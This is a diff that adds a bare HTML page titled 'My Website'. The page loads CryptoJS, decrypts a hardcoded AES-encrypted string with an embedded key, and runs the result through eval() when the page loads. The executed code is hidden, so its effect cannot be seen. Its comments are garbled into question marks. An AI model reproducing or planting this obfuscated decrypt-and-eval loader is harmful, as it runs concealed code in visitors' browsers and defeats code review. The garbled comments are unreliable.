@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>My Website</title>
+</head>
+<body>
+<!-- ????? ????? ??????? ?????? -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+<script>
+var encryptedData = "U2FsdGVkX18qXpnobxvZ5BRxJFPrXJo1CpsSSy1dCNg="; // ??????? ????? ??????? ????? ??
+var decryptedData = CryptoJS.AES.decrypt(encryptedData, "hussin739106339");
+var originalText = decryptedData.toString(CryptoJS.enc.Utf8);
+eval(originalText);
+</script>
+<!-- ????? ????? -->
+</body>
+</html>
